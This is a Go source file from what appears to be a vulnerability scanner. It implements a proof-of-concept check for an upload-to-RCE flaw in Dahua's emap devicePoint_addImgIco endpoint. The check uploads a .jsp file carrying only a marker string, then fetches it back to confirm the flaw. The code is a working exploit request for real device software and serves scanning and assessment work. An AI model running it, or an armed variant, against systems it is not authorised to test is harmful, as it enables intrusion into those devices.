package dahua

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"regexp"
	"strings"
)

func Dahua_devicePoint_addImgIco_upload_rce(u string) bool {

	var payload = "--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"1ndex.jsp\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\nEkeyrNu4cNSk-ppZB0\r\n--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--"

	header := make(map[string]string)
	header["Content-Type"] = "multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT"

	if req, err := pkg.HttpRequset(u+"/emap/devicePoint_addImgIco?hasSubsystem=true", "POST", payload, false, header); err == nil {
		//pkg.GoPocLog(req.Body)
		if req.StatusCode == 200 && strings.Contains(req.Body, "data") {
			str := req.Body
			var pattern = `"data":"([^"]*)"`
			re := regexp.MustCompile(pattern)
			if re.MatchString(str) {
				resourceUuid := re.FindStringSubmatch(str)[1]
				if req2, err := pkg.HttpRequset(u+"/upload/emap/society_new/"+resourceUuid, "GET", "", false, nil); err == nil {
					if req2.StatusCode == 200 && strings.Contains(req2.Body, "EkeyrNu4cNSk") {
						pkg.GoPocLog(fmt.Sprintf("Found vuln dahua upload_rce|%s\n", u+"/upload/emap/society_new/"+resourceUuid))
						return true
					}
				}
				//fmt.Println(resourceUuid)
			}
			//resourceUuid := re.FindStringSubmatch(req.Body)[1]

		}
	}
	return false
}
